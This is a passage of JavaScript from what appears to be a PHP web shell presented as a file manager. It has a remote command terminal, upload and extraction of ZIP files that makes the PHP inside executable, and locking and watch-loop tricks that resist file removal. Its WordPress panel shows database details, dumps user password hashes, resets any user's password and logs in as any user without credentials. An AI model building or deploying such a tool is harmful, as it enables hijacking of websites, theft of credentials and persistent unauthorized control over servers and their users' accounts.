    inputHtml = `<input type="text" inputmode="numeric" pattern="[0-7]{3,4}" maxlength="4" value="${current}" style="background:var(--bg-2);color:var(--text);border:1px solid var(--accent);border-radius:4px;padding:2px 6px;font-size:12px;width:60px;font-family:var(--font-mono);text-align:center">`;
  }
  cell.innerHTML = inputHtml;
  const inp = cell.querySelector('input');
  inp.focus();
  if (kind === 'perms') inp.select();
  let done = false;
  const cancel = () => { if (done) return; done = true; cell.innerHTML = old; };
  const commit = async () => {
    if (done) return; done = true;
    const val = inp.value.trim();
    if (!val) { cell.innerHTML = old; return; }
    cell.innerHTML = '<span style="opacity:.5;font-size:11px">…</span>';
    let res;
    if (kind === 'date') {
      res = await api('touch', { path, datetime: val.replace('T', ' ') + ':00' });
    } else {
      if (!/^[0-7]{3,4}$/.test(val)) { toast('Invalid octal (e.g. 644 or 0644)', 'error'); cell.innerHTML = old; return; }
      res = await api('chmod', { path, mode: val.padStart(4, '0') });
    }
    if (res.ok) { toast(res.msg || 'Updated', 'success'); navigate(state.path); }
    else { toast(res.msg || 'Failed', 'error'); cell.innerHTML = old; }
  };
  inp.addEventListener('keydown', e => {
    e.stopPropagation();
    if (e.key === 'Enter') { e.preventDefault(); commit(); }
    else if (e.key === 'Escape') { e.preventDefault(); cancel(); }
  });
  inp.addEventListener('blur', commit);
  inp.addEventListener('click', e => e.stopPropagation());
}

async function deleteSelected() {
  if (state.selected.size === 0) return;
  const items = [...state.selected];
  showConfirm(
    `Delete ${items.length} item(s)?`,
    `This action cannot be undone.`,
    async () => {
      const res = await api('delete', { items });
      if (res.ok) { toast(res.msg, 'success'); state.selected.clear(); navigate(state.path); }
      else toast(res.msg, 'error');
    }
  );
}

async function deleteSingle(path) {
  const name = path.split('/').pop();
  showConfirm(
    `Delete "${name}"?`,
    `This action cannot be undone.`,
    async () => {
      const res = await api('delete', { items: [path] });
      if (res.ok) { toast(res.msg, 'success'); navigate(state.path); }
      else toast(res.msg, 'error');
    }
  );
}

function openCopyMove(op) {
  if (state.selected.size === 0) { toast('Select items first'); return; }
  document.getElementById('copy-move-title').textContent = op === 'copy' ? 'Copy To' : 'Move To';
  document.getElementById('copy-move-current').textContent = '/' + state.path;
  document.getElementById('copy-move-dest').value = state.path;
  document.getElementById('copy-move-btn').textContent = op === 'copy' ? 'Copy' : 'Move';
  document.getElementById('copy-move-btn').dataset.op = op;
  openModal('modal-copy-move');
}

async function doCopyMove() {
  const op   = document.getElementById('copy-move-btn').dataset.op;
  const dest = document.getElementById('copy-move-dest').value.trim();
  const items = [...state.selected];
  const res = await api(op, { items, dest });
  closeModal('modal-copy-move');
  if (res.ok) { toast(res.msg, 'success'); state.selected.clear(); navigate(state.path); }
  else toast(res.msg, 'error');
}

async function duplicateItem(path) {
  const res = await api('duplicate', { item: path });
  if (res.ok) { toast(res.msg, 'success'); navigate(state.path); }
  else toast(res.msg, 'error');
}

function openZip() {
  const base = state.items.length === 1 ? state.items[0].name : 'archive';
  document.getElementById('zip-name').value = `${base}_${Date.now()}.zip`;
  openModal('modal-zip');
}

async function doZip() {
  const zipname = document.getElementById('zip-name').value.trim();
  const items   = [...state.selected].map(p => p.split('/').pop());
  const res = await api('zip', { path: state.path, items, zipname });
  closeModal('modal-zip');
  if (res.ok) { toast(res.msg, 'success'); navigate(state.path); }
  else toast(res.msg, 'error');
}

async function unzipFile(path, toFolder) {
  const res = await api('unzip', { path, to_folder: toFolder ? '1' : '0' });
  if (res.ok) { toast(res.msg, 'success'); navigate(state.path); }
  else toast(res.msg, 'error');
}

function downloadFile(path) {
  const url = `${FM.SELF}?action=download&path=${encodeURIComponent(path)}`;
  const a = document.createElement('a');
  a.href = url;
  a.download = path.split('/').pop();
  document.body.appendChild(a);
  a.click();
  a.remove();
}

// ──────────────────────────────────────────────
// CHMOD
// ──────────────────────────────────────────────
function openChmod(path) {
  document.getElementById('chmod-file').textContent = path;
  // Get current perms from state
  const item = state.items.find(i => (state.path ? state.path + '/' : '') + i.name === path);
  const perms = item ? item.perms : '0644';
  const p = parseInt(perms, 8);
  document.getElementById('cm-ur').checked = !!(p & 0o400);
  document.getElementById('cm-uw').checked = !!(p & 0o200);
  document.getElementById('cm-ux').checked = !!(p & 0o100);
  document.getElementById('cm-gr').checked = !!(p & 0o040);
  document.getElementById('cm-gw').checked = !!(p & 0o020);
  document.getElementById('cm-gx').checked = !!(p & 0o010);
  document.getElementById('cm-or').checked = !!(p & 0o004);
  document.getElementById('cm-ow').checked = !!(p & 0o002);
  document.getElementById('cm-ox').checked = !!(p & 0o001);
  updateChmodOctal();
  openModal('modal-chmod');
  document.querySelectorAll('[id^="cm-"]').forEach(cb => cb.onchange = updateChmodOctal);
}

function updateChmodOctal() {
  let m = 0;
  if (document.getElementById('cm-ur').checked) m |= 0o400;
  if (document.getElementById('cm-uw').checked) m |= 0o200;
  if (document.getElementById('cm-ux').checked) m |= 0o100;
  if (document.getElementById('cm-gr').checked) m |= 0o040;
  if (document.getElementById('cm-gw').checked) m |= 0o020;
  if (document.getElementById('cm-gx').checked) m |= 0o010;
  if (document.getElementById('cm-or').checked) m |= 0o004;
  if (document.getElementById('cm-ow').checked) m |= 0o002;
  if (document.getElementById('cm-ox').checked) m |= 0o001;
  document.getElementById('chmod-octal').textContent = '→ ' + m.toString(8).padStart(4,'0');
}

async function doChmod() {
  const path = document.getElementById('chmod-file').textContent;
  let m = 0;
  if (document.getElementById('cm-ur').checked) m |= 0o400;
  if (document.getElementById('cm-uw').checked) m |= 0o200;
  if (document.getElementById('cm-ux').checked) m |= 0o100;
  if (document.getElementById('cm-gr').checked) m |= 0o040;
  if (document.getElementById('cm-gw').checked) m |= 0o020;
  if (document.getElementById('cm-gx').checked) m |= 0o010;
  if (document.getElementById('cm-or').checked) m |= 0o004;
  if (document.getElementById('cm-ow').checked) m |= 0o002;
  if (document.getElementById('cm-ox').checked) m |= 0o001;
  const mode = m.toString(8).padStart(4,'0');
  const res = await api('chmod', { path, mode });
  closeModal('modal-chmod');
  if (res.ok) { toast(res.msg, 'success'); navigate(state.path); }
  else toast(res.msg, 'error');
}

// ──────────────────────────────────────────────
// PROPERTIES
// ──────────────────────────────────────────────
async function openProps(path) {
  openModal('modal-props');
  document.getElementById('props-grid').innerHTML = '<div class="spinner"></div>';
  const res = await api('info', { path });
  if (!res.ok) { document.getElementById('props-grid').innerHTML = `<p style="color:var(--danger)">${esc(res.msg)}</p>`; return; }
  const d = res.data;
  const rows = [
    ['Name', d.name], ['Path', d.path || '/'], ['Type', d.is_dir ? 'Directory' : 'File'],
    ['Size', d.size_fmt || '—'], ['MIME', d.mime || '—'], ['Modified', d.mtime],
    ['Accessed', d.atime], ['Permissions', d.perms], ['Owner', d.owner],
    ...(d.width ? [['Dimensions', `${d.width} × ${d.height}`]] : []),
  ];
  document.getElementById('props-grid').innerHTML = rows.map(([l,v]) =>
    `<div class="prop-item"><label>${esc(l)}</label><div class="prop-value">${esc(String(v||'—'))}</div></div>`
  ).join('');
}

// ──────────────────────────────────────────────
// UPLOAD
// ──────────────────────────────────────────────
function openUpload() {
  document.getElementById('upload-list').innerHTML = '';
  openModal('modal-upload');
}

async function handleFileSelect(files) {
  for (const file of files) {
    await uploadFile(file);
  }
}

async function uploadFile(file) {
  const list = document.getElementById('upload-list');
  const id   = 'up-' + Date.now();
  const item = document.createElement('div');
  item.className = 'upload-item';
  item.id = id;
  item.innerHTML = `
    <i class="fa-solid fa-file" style="color:var(--text-dim);flex-shrink:0"></i>
    <div class="up-name">${esc(file.name)}</div>
    <div class="up-size">${formatSize(file.size)}</div>
    <div class="upload-status" id="${id}-st">Waiting...</div>
    <div class="upload-progress" style="width:60px"><div class="upload-progress-bar" id="${id}-bar" style="width:0%"></div></div>`;
  list.appendChild(item);

  const CHUNK = <?= $CONFIG['chunk_size_mb'] * 1024 * 1024 ?>;
  const totalChunks = Math.ceil(file.size / CHUNK);

  for (let i = 0; i < totalChunks; i++) {
    const chunk = file.slice(i * CHUNK, (i + 1) * CHUNK);
    const fd = new FormData();
    fd.append('action', 'upload');
    fd.append('_token', FM.TOKEN);
    fd.append('path', state.path);
    fd.append('file', chunk, file.name);
    fd.append('dzchunkindex', i);
    fd.append('dztotalchunkcount', totalChunks);
    fd.append('dzuuid', id);

    document.getElementById(id + '-st').textContent = `${Math.round(((i+1)/totalChunks)*100)}%`;
    document.getElementById(id + '-bar').style.width = `${Math.round(((i+1)/totalChunks)*100)}%`;

    try {
      const r = await fetch(FM.SELF, { method: 'POST', body: fd });
      const j = await r.json();
      if (!j.ok) {
        document.getElementById(id + '-st').textContent = 'Error';
        document.getElementById(id + '-st').className = 'upload-status error';
        return;
      }
    } catch(e) {
      document.getElementById(id + '-st').textContent = 'Failed';
      document.getElementById(id + '-st').className = 'upload-status error';
      return;
    }
  }

  document.getElementById(id + '-st').textContent = '✓ Done';
  document.getElementById(id + '-st').className = 'upload-status done';
  document.getElementById(id + '-bar').style.width = '100%';
  navigate(state.path);
}

// Drag & drop onto file area
function setupDropZone() {
  const container = document.getElementById('files-container');
  const overlay   = document.getElementById('drop-overlay');
  if (!container) return;

  container.addEventListener('dragover', e => {
    e.preventDefault();
    if (e.dataTransfer.types.includes('Files')) overlay.classList.add('visible');
  });
  container.addEventListener('dragleave', e => {
    if (!container.contains(e.relatedTarget)) overlay.classList.remove('visible');
  });
  container.addEventListener('drop', e => {
    e.preventDefault();
    overlay.classList.remove('visible');
    if (FM.READONLY) { toast('Read-only mode', 'error'); return; }
    const files = [...e.dataTransfer.files];
    if (files.length) { openUpload(); files.forEach(uploadFile); }
  });

  // Upload zone
  const zone = document.getElementById('upload-zone');
  if (zone) {
    zone.addEventListener('dragover', e => { e.preventDefault(); zone.classList.add('dragover'); });
    zone.addEventListener('dragleave', () => zone.classList.remove('dragover'));
    zone.addEventListener('drop', e => {
      e.preventDefault();
      zone.classList.remove('dragover');
      handleFileSelect(e.dataTransfer.files);
    });
  }

  // ZIP-extract drop zone
  const zxZone = document.getElementById('zx-zone');
  if (zxZone) {
    zxZone.addEventListener('dragover',  e => { e.preventDefault(); zxZone.classList.add('dragover'); });
    zxZone.addEventListener('dragleave', () => zxZone.classList.remove('dragover'));
    zxZone.addEventListener('drop', e => {
      e.preventDefault();
      zxZone.classList.remove('dragover');
      handleZipSelect(e.dataTransfer.files);
    });
  }

  // WP plugin upload zone
  const wpUp = document.getElementById('wp-plug-upload');
  if (wpUp) {
    wpUp.addEventListener('dragover',  e => { e.preventDefault(); wpUp.classList.add('dragover'); });
    wpUp.addEventListener('dragleave', () => wpUp.classList.remove('dragover'));
    wpUp.addEventListener('drop', e => {
      e.preventDefault();
      wpUp.classList.remove('dragover');
      if (e.dataTransfer.files.length) wpPluginUpload(e.dataTransfer.files[0]);
    });
  }
}

// ──────────────────────────────────────────────
// ZIP UPLOAD + EXTRACT (chmod 0755 for PHP)
// ──────────────────────────────────────────────
function openUploadExtract() {
  document.getElementById('zx-list').innerHTML = '';
  const inp = document.getElementById('zx-input');
  if (inp) inp.value = '';
  openModal('modal-upload-extract');
}

async function handleZipSelect(files) {
  for (const f of files) await uploadZipAndExtract(f);
}

async function uploadZipAndExtract(file) {
  if (!file) return;
  if (!/\.zip$/i.test(file.name)) { toast('Only .zip files are supported here', 'error'); return; }

  const list = document.getElementById('zx-list');
  const id   = 'zx-' + Date.now();
  const item = document.createElement('div');
  item.className = 'upload-item';
  item.id = id;
  item.innerHTML = `
    <i class="fa-solid fa-file-zipper" style="color:#fbbf24;flex-shrink:0"></i>
    <div class="up-name">${esc(file.name)}</div>
    <div class="up-size">${formatSize(file.size)}</div>
    <div class="upload-status" id="${id}-st">Uploading...</div>
    <div class="upload-progress" style="width:60px"><div class="upload-progress-bar" id="${id}-bar" style="width:0%;background:#fbbf24"></div></div>`;
  list.appendChild(item);

  const CHUNK = <?= $CONFIG['chunk_size_mb'] * 1024 * 1024 ?>;
  const totalChunks = Math.max(1, Math.ceil(file.size / CHUNK));
  const uuid = id;

  for (let i = 0; i < totalChunks; i++) {
    const chunk = file.slice(i * CHUNK, (i + 1) * CHUNK);
    const fd = new FormData();
    fd.append('action', 'upload_extract');
    fd.append('_token', FM.TOKEN);
    fd.append('path', state.path);
    fd.append('file', chunk, file.name);
    fd.append('dzchunkindex', i);
    fd.append('dztotalchunkcount', totalChunks);
    fd.append('dzuuid', uuid);

    const pct = Math.round(((i+1)/totalChunks)*100);
    document.getElementById(id + '-st').textContent = pct + '%';
    document.getElementById(id + '-bar').style.width = pct + '%';

    let j;
    try {
      const r = await fetch(FM.SELF, { method: 'POST', body: fd });
      j = await r.json();
    } catch (e) {
      document.getElementById(id + '-st').textContent = 'Network error';
      document.getElementById(id + '-st').className = 'upload-status error';
      return;
    }
    if (!j.ok) {
      document.getElementById(id + '-st').textContent = j.msg || 'Error';
      document.getElementById(id + '-st').className = 'upload-status error';
      return;
    }

    // Final chunk returns extraction stats
    if (i === totalChunks - 1) {
      const d = j.data || {};
      const bits = [`${d.extracted||0} files`];
      if (d.php)      bits.push(`${d.php} PHP activated`);
      if (d.overwrit) bits.push(`${d.overwrit} overwritten`);
      if (d.rejected) bits.push(`${d.rejected} blocked`);
      document.getElementById(id + '-st').textContent = '✓ ' + bits.join(', ');
      document.getElementById(id + '-st').className = 'upload-status done';
      document.getElementById(id + '-bar').style.width = '100%';
      toast(`ZIP extracted — ${bits.join(', ')}`, d.rejected ? 'info' : 'success');
      navigate(state.path);
    }
  }
}

// ──────────────────────────────────────────────
// WORDPRESS PANEL
// ──────────────────────────────────────────────
function openWpPanel() {
  if (!FM.WP_ROOT) { toast('WordPress not detected from this folder', 'error'); return; }
  openModal('modal-wp');
  wpSwitchTab('info');
}

function wpSwitchTab(name) {
  document.querySelectorAll('#wp-tabs .wp-tab').forEach(t => t.classList.toggle('active', t.dataset.tab === name));
  document.querySelectorAll('.wp-pane').forEach(p => p.classList.remove('active'));
  const pane = document.getElementById('wp-pane-' + name);
  if (pane) pane.classList.add('active');
  if (name === 'info')    wpLoadInfo();
  if (name === 'users')   wpLoadUsers();
  if (name === 'plugins') wpLoadPlugins();
}

function wpReload() {
  const active = document.querySelector('#wp-tabs .wp-tab.active');
  wpSwitchTab(active ? active.dataset.tab : 'info');
}

async function wpLoadInfo() {
  const box = document.getElementById('wp-info-body');
  box.innerHTML = '<div class="spinner"></div>';
  const r = await api('wp_info');
  if (!r.ok) { box.innerHTML = `<p style="color:var(--danger)">${esc(r.msg)}</p>`; return; }
  const d = r.data;
  const rows = [
    ['WP Root',  d.wp_root],
    ['ABSPATH',  d.abspath],
    ['Version',  d.version],
    ['Site URL', d.site_url ? `<a href="${esc(d.site_url)}" target="_blank" rel="noopener">${esc(d.site_url)}</a>` : ''],
    ['Admin URL',d.admin_url ? `<a href="${esc(d.admin_url)}" target="_blank" rel="noopener">${esc(d.admin_url)}</a>` : ''],
    ['DB Host',  d.db_host],
    ['DB Name',  d.db_name],
    ['DB User',  d.db_user],
  ];
  box.innerHTML = `<div class="wp-info-grid">` +
    rows.map(([l,v]) => `<label>${esc(l)}</label><div class="v">${v || '&mdash;'}</div>`).join('') +
    `</div>`;
}

async function wpLoadUsers() {
  const box = document.getElementById('wp-users-body');
  box.innerHTML = '<div class="spinner"></div>';
  const r = await api('wp_users');
  if (!r.ok) { box.innerHTML = `<p style="color:var(--danger)">${esc(r.msg)}</p>`; return; }
  const users = r.data || [];
  if (!users.length) { box.innerHTML = '<p style="color:var(--text-muted);padding:16px">No users.</p>'; return; }
  box.innerHTML = `
    <table class="wp-table">
      <thead><tr>
        <th style="width:42px">ID</th>
        <th>Login</th>
        <th>Email</th>
        <th>Registered</th>
        <th>Roles</th>
        <th style="width:220px">Password hash</th>
        <th style="width:200px">Action</th>
      </tr></thead>
      <tbody>${users.map(u => `
        <tr id="wp-u-${u.id}">
          <td>${u.id}</td>
          <td><strong>${esc(u.login)}</strong></td>
          <td>${esc(u.email)}</td>
          <td style="font-size:12px;color:var(--text-muted)">${esc(u.reg)}</td>
          <td>${(u.roles||'').split(',').map(r => r.trim()).filter(Boolean).map(r => `<span class="wp-role">${esc(r)}</span>`).join(' ') || '<span class="wp-role">&mdash;</span>'}</td>
          <td><div class="wp-hash" title="${esc(u.pass)}">${esc((u.pass||'').slice(0,32))}&hellip;</div></td>
          <td style="display:flex;gap:4px;flex-wrap:nowrap"><button class="btn btn-primary btn-sm" onclick="wpLoginAs(${u.id}, '${esc(u.login)}')">
            <i class="fa-solid fa-right-to-bracket"></i> Login
          </button><button class="btn btn-warning btn-sm" onclick="wpResetPass(${u.id}, '${esc(u.login)}')">
            <i class="fa-solid fa-key"></i> Reset
          </button></td>
        </tr>
        <tr id="wp-u-${u.id}-reveal" style="display:none"><td colspan="7"><div id="wp-u-${u.id}-reveal-body"></div></td></tr>
      `).join('')}</tbody>
    </table>`;
}

async function wpResetPass(uid, login) {
  const row = document.getElementById(`wp-u-${uid}-reveal`);
  const body = document.getElementById(`wp-u-${uid}-reveal-body`);
  if (!row || !body) return;
  row.style.display = '';
  body.innerHTML = '<div class="spinner"></div>';
  const r = await api('wp_user_reset', { uid });
  if (!r.ok) { body.innerHTML = `<p style="color:var(--danger);padding:8px 4px">${esc(r.msg)}</p>`; return; }
  const np = r.data.password;
  body.innerHTML = `
    <div class="wp-reveal">
      <i class="fa-solid fa-key" style="color:var(--accent)"></i>
      <div style="min-width:120px"><strong>${esc(login)}</strong><br><span style="font-size:11px;color:var(--text-muted)">New password</span></div>
      <code id="wp-np-${uid}">${esc(np)}</code>
      <button class="btn btn-ghost btn-sm" onclick="wpCopy('wp-np-${uid}')"><i class="fa-regular fa-copy"></i> Copy</button>
      <button class="icon-btn" onclick="document.getElementById('wp-u-${uid}-reveal').style.display='none'" title="Hide"><i class="fa-solid fa-xmark"></i></button>
    </div>`;
  toast('Password reset for ' + login, 'success');
}

async function wpLoginAs(uid, login) {
  if (!confirm('Login as ' + login + ' to wp-admin?')) return;
  toast('Setting login cookie...', 'info');
  const r = await api('wp_user_login', { uid });
  if (!r.ok) { toast(r.msg || 'Login failed', 'error'); return; }
  toast('Logged in as ' + login, 'success');
  window.open(r.data.admin_url, '_blank');
}

function wpCopy(elId) {
  const el = document.getElementById(elId);
  if (!el) return;
  const txt = el.textContent;
  (navigator.clipboard && navigator.clipboard.writeText
    ? navigator.clipboard.writeText(txt)
    : Promise.reject()).then(
      () => toast('Copied to clipboard', 'success'),
      () => {
        const ta = document.createElement('textarea');
        ta.value = txt; document.body.appendChild(ta); ta.select();
        try { document.execCommand('copy'); toast('Copied', 'success'); } catch(e) { toast('Copy failed', 'error'); }
        document.body.removeChild(ta);
      }
    );
}

async function wpLoadPlugins() {
  const box = document.getElementById('wp-plugins-body');
  box.innerHTML = '<div class="spinner"></div>';
  const r = await api('wp_plugins');
  if (!r.ok) { box.innerHTML = `<p style="color:var(--danger)">${esc(r.msg)}</p>`; return; }
  const list = r.data || [];
  if (!list.length) { box.innerHTML = '<p style="color:var(--text-muted);padding:8px">No plugins installed.</p>'; return; }
  box.innerHTML = `
    <table class="wp-table">
      <thead><tr>
        <th>Plugin</th>
        <th style="width:80px">Version</th>
        <th style="width:90px">Status</th>
        <th style="width:230px">Actions</th>
      </tr></thead>
      <tbody>${list.map(p => `
        <tr>
          <td>
            <div><strong>${esc(p.name)}</strong></div>
            <div style="font-size:11px;color:var(--text-dim);font-family:var(--font-mono)">${esc(p.slug)}</div>
            ${p.author ? `<div style="font-size:11px;color:var(--text-muted);margin-top:2px">by ${esc(p.author)}</div>` : ''}
          </td>
          <td style="font-family:var(--font-mono);font-size:12px">${esc(p.version||'')}</td>
          <td><span class="wp-pill ${p.active?'on':'off'}">${p.active?'Active':'Inactive'}</span></td>
          <td><div class="wp-actbar">
            ${p.active
              ? `<button class="btn btn-ghost btn-sm" onclick="wpPluginAction('d','${esc(p.slug)}')"><i class="fa-solid fa-pause"></i> Deactivate</button>`
              : `<button class="btn btn-success btn-sm" onclick="wpPluginAction('a','${esc(p.slug)}')"><i class="fa-solid fa-play"></i> Activate</button>`}
            <button class="btn btn-danger btn-sm" onclick="wpPluginAction('x','${esc(p.slug)}')"><i class="fa-solid fa-trash"></i> Delete</button>
          </div></td>
        </tr>`).join('')}</tbody>
    </table>`;
}

async function wpPluginAction(ac, slug) {
  if (ac === 'x' && !confirm('Delete plugin "' + slug + '" permanently?')) return;
  const r = await api('wp_plugin_act', { ac, slug });
  if (!r.ok) { toast(r.msg || 'Action failed', 'error'); return; }
  toast(r.msg || 'Done', 'success');
  wpLoadPlugins();
}

async function wpPluginUpload(file) {
  if (!file) return;
  if (!/\.zip$/i.test(file.name)) { toast('Plugin must be a .zip file', 'error'); return; }
  const status = document.getElementById('wp-plug-upload-status');
  status.innerHTML = `<div class="upload-item"><i class="fa-solid fa-file-zipper" style="color:#3399ff"></i>
    <div class="up-name">${esc(file.name)}</div>
    <div class="upload-status" id="wpu-st">Uploading...</div></div>`;
  const fd = new FormData();
  fd.append('action', 'wp_plugin_upload');
  fd.append('_token', FM.TOKEN);
  fd.append('file', file);
  try {
    const r = await fetch(FM.SELF, { method: 'POST', body: fd });
    const j = await r.json();
    if (!j.ok) { document.getElementById('wpu-st').textContent = j.msg || 'Failed'; document.getElementById('wpu-st').className = 'upload-status error'; return; }
    const d = j.data || {};
    document.getElementById('wpu-st').textContent = `✓ ${d.extracted||0} files installed`;
    document.getElementById('wpu-st').className = 'upload-status done';
    toast('Plugin installed', 'success');
    document.getElementById('wp-plug-input').value = '';
    wpLoadPlugins();
  } catch(e) {
    document.getElementById('wpu-st').textContent = 'Network error';
    document.getElementById('wpu-st').className = 'upload-status error';
  }
}

// ──────────────────────────────────────────────
// SEARCH
// ──────────────────────────────────────────────
let searchTimer = null;
document.addEventListener('DOMContentLoaded', () => {
  const inp = document.getElementById('search-input');
  if (!inp) return;
  inp.addEventListener('keydown', e => {
    if (e.key === 'Enter') {
      document.getElementById('search-full-input').value = inp.value;
      openModal('modal-search');
      doSearch();
    }
  });
});

async function doSearch() {
  const q = document.getElementById('search-full-input').value.trim();
  if (q.length < 2) return;
  const res = document.getElementById('search-results');
  res.innerHTML = '<div style="display:flex;gap:8px;padding:12px"><div class="spinner"></div> Searching...</div>';
  const r = await api('search', { path: state.path, query: q });
  if (!r.ok) { res.innerHTML = `<p style="color:var(--danger)">${esc(r.msg)}</p>`; return; }
  if (!r.data.length) { res.innerHTML = `<p style="color:var(--text-dim);padding:12px">No results found.</p>`; return; }
  res.innerHTML = r.data.map(item => `
    <div class="search-result" onclick="searchNavigate('${esc(item.path)}','${esc(item.name)}',${item.is_dir})">
      <i class="fa-solid fa-${item.is_dir?'folder':'file'}" style="color:${item.is_dir?'#fbbf24':'var(--text-muted)'}"></i>
      <div>
        <div class="sr-name">${esc(item.name)}</div>
        <div class="sr-path">${esc(item.path||'/')}</div>
      </div>
      ${item.size ? `<span class="badge">${esc(item.size)}</span>` : ''}
    </div>
  `).join('');
}

async function searchNavigate(path, name, isDir) {
  closeModal('modal-search');
  await navigate(path);
  if (!isDir) {
    setTimeout(() => previewFile((path ? path + '/' : '') + name), 300);
  }
}

// ──────────────────────────────────────────────
// CONTEXT MENU
// ──────────────────────────────────────────────
function showCtx(e, path, isDir) {
  e.preventDefault();
  const menu = document.getElementById('ctx-menu');
  const name = path.split('/').pop();
  const ext  = name.split('.').pop().toLowerCase();
  const isZip = ['zip','tar','gz','bz2','7z','rar'].includes(ext);
  const isText = !isDir; // simplification; could check

  let items = [];
  if (FM.READONLY) {
    // Readonly user: minimal context menu
    items = [
      { icon: 'fa-folder-open', label: 'Open', action: () => navigate(path), show: isDir },
      { icon: 'fa-clipboard', label: 'Copy Path', action: () => copyToClipboard('/' + path), show: true },
      { icon: 'fa-circle-info', label: 'Properties', action: () => openProps(path), show: true },
    ];
  } else {
    // Admin: full context menu
    items = [
    { icon: 'fa-eye',   label: 'Preview', action: () => previewFile(path), show: !isDir },
    { icon: 'fa-code',  label: 'Edit',    action: () => openEditor(path), show: !isDir && !FM.READONLY },
    { sep: true },
    { icon: 'fa-download', label: 'Download', action: () => downloadFile(path), show: !isDir },
    { icon: 'fa-copy',  label: 'Copy Link', action: () => copyLink(path), show: true },
    { icon: 'fa-clipboard', label: 'Copy Path', action: () => copyToClipboard('/' + path), show: true },
    { sep: true, show: !FM.READONLY },
    { icon: 'fa-pen',   label: 'Rename', action: () => openRename(path), show: !FM.READONLY },
    { icon: 'fa-clone', label: 'Duplicate', action: () => duplicateItem(path), show: !FM.READONLY && !isDir },
    { sep: true, show: !FM.READONLY },
    { icon: 'fa-lock', label: '🔒 Lock (0555/0444)', action: () => qLockItem(path), show: !FM.READONLY },
    { icon: 'fa-lock-open', label: '🔓 Unlock (0755/0644)', action: () => qUnlockItem(path), show: !FM.READONLY },
    { icon: 'fa-shield', label: '🔐 Lock Permanent (chattr)', action: () => lockChattr(path), show: !FM.READONLY },
    { icon: 'fa-shield', label: '🔓 Unlock Permanent (chattr)', action: () => unlockChattr(path), show: !FM.READONLY },
    { icon: 'fa-eye', label: '👁 Lock & Watch (loop)', action: () => lockWatch(path), show: !FM.READONLY },
    { icon: 'fa-eye-slash', label: '👁 Unlock & Stop Watch', action: () => unlockStop(path), show: !FM.READONLY },
    { icon: 'fa-shield-virus', label: '🛡️ Security Scan', action: () => scanMalware(path), show: !FM.READONLY && isDir },
    { icon: 'fa-file-zipper', label: 'Compress', action: () => { state.selected.clear(); state.selected.add(path); openZip(); }, show: !FM.READONLY },
    { icon: 'fa-box-open', label: 'Extract Here', action: () => unzipFile(path, false), show: !FM.READONLY && isZip },
    { icon: 'fa-folder-open', label: 'Extract to Folder', action: () => unzipFile(path, true), show: !FM.READONLY && isZip },
    { icon: 'fa-shield-halved', label: 'Permissions', action: () => openChmod(path), show: !FM.READONLY },
    { icon: 'fa-circle-info', label: 'Properties', action: () => openProps(path), show: true },
    { sep: true },
    { icon: 'fa-trash', label: 'Delete', action: () => deleteSingle(path), show: !FM.READONLY, danger: true },
  ];
  } // end admin context menu

  menu.innerHTML = items.filter(i => i.show !== false).map(i => {
    if (i.sep) return '<div class="ctx-sep"></div>';
    return `<div class="ctx-item ${i.danger?'danger':''}" id="ctx-action-${Math.random().toString(36).slice(2)}">
      <i class="fa-solid ${i.icon}"></i> ${i.label}
    </div>`;
  }).join('');

  // Attach click handlers
  let idx = 0;
  const divs = menu.querySelectorAll('.ctx-item');
  items.filter(i => !i.sep && i.show !== false).forEach((item, j) => {
    divs[j].addEventListener('click', () => {
      hideCtx();
      item.action();
    });
  });

  // Position
  menu.style.display = 'block';
  const mw = menu.offsetWidth, mh = menu.offsetHeight;
  let x = e.clientX, y = e.clientY;
  if (x + mw > window.innerWidth) x = window.innerWidth - mw - 8;
  if (y + mh > window.innerHeight) y = window.innerHeight - mh - 8;
  menu.style.left = x + 'px';
  menu.style.top = y + 'px';
}

function hideCtx() {
  document.getElementById('ctx-menu').style.display = 'none';
}
document.addEventListener('click', hideCtx);
document.addEventListener('contextmenu', (e) => {
  if (!e.target.closest('.file-card') && !e.target.closest('#files-table tr[data-path]')) hideCtx();
});

// ──────────────────────────────────────────────
// TERMINAL
// ──────────────────────────────────────────────
function toggleTerminal() {
  const app = document.getElementById('app');
  const panel = document.getElementById('terminal-panel');
  const btn = document.getElementById('btn-terminal');
  if (!app || !panel) return;
  const isOpen = app.classList.toggle('terminal-open');
  panel.style.display = isOpen ? '' : 'none';
  if (btn) btn.classList.toggle('active', isOpen);
  if (isOpen) {
    document.getElementById('terminal-input').focus();
    // Show full pwd on open
    runTermCmd('pwd');
  }
}

function clearTerminal() {
  document.getElementById('terminal-output').innerHTML = '';
}

async function runTermCmd(cmd) {
  const out = document.getElementById('terminal-output');
  const prompt = state.termCwd ? state.termCwd.split('/').pop() || '~' : '~';

  // Show command in output
  out.innerHTML += `<div class="term-line"><span class="term-prompt">${esc(prompt)} $</span> <span class="term-cmd">${esc(cmd)}</span></div>`;

  const res = await api('terminal', { cmd, path: state.termCwd });
  if (res.ok) {
    const d = res.data;
    if (d.output) {
      out.innerHTML += `<div class="term-line term-output">${esc(d.output)}</div>`;
    }
    if (d.cwd !== undefined) {
      state.termCwd = d.cwd;
      const label = d.cwd ? d.cwd.split('/').pop() || '~' : '~';
      document.getElementById('term-prompt-label').textContent = label + ' $';
      document.getElementById('term-cwd').textContent = '~/' + d.cwd;
    }
  } else {
    out.innerHTML += `<div class="term-line term-error">${esc(res.msg)}</div>`;
  }
  out.scrollTop = out.scrollHeight;
}

document.addEventListener('DOMContentLoaded', () => {
  const termInput = document.getElementById('terminal-input');
  if (termInput) {
    termInput.addEventListener('keydown', e => {
      if (e.key === 'Enter') {
        const cmd = termInput.value.trim();
        if (!cmd) return;
        state.termHistory.push(cmd);
        state.termHistIdx = state.termHistory.length;
        termInput.value = '';
        runTermCmd(cmd);
      } else if (e.key === 'ArrowUp') {
        e.preventDefault();
        if (state.termHistIdx > 0) {
          state.termHistIdx--;
          termInput.value = state.termHistory[state.termHistIdx] || '';
        }
      } else if (e.key === 'ArrowDown') {
        e.preventDefault();
        if (state.termHistIdx < state.termHistory.length - 1) {
          state.termHistIdx++;
          termInput.value = state.termHistory[state.termHistIdx] || '';
        } else {
          state.termHistIdx = state.termHistory.length;
          termInput.value = '';
        }
      }
    });
  }
});

// ──────────────────────────────────────────────
// TOAST
// ──────────────────────────────────────────────
function toast(msg, type = 'info') {
  const container = document.getElementById('toast-container');
  if (!container) return;
  const icons = { success: 'fa-circle-check', error: 'fa-circle-xmark', info: 'fa-circle-info' };
  const el = document.createElement('div');
  el.className = `toast ${type}`;
  el.innerHTML = `<i class="fa-solid ${icons[type] || icons.info}"></i> ${esc(msg)}`;
  container.appendChild(el);
